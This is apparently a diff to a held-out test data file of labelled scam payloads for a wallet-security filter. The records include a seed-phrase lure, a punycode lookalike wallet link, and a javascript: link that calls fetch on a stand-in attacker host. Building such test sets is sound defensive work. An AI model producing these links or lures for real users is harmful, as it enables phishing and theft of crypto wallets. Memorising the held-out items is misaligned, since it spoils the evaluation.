@@ -26,4 +26,3 @@
 {"id":"held-secret-003","category":"SECRET_EXFIL","payload":"Recovery words: abandon ability able about above absent absorb abstract absurd abuse access acid."}
 {"id":"held-link-001","category":"MALICIOUS_LINK","payload":"Continue at https://xn--wllt-7qa.example/connect to restore access."}
 {"id":"held-link-002","category":"MALICIOUS_LINK","payload":"Open javascript:fetch('https://attacker.invalid') to validate the wallet."}
-
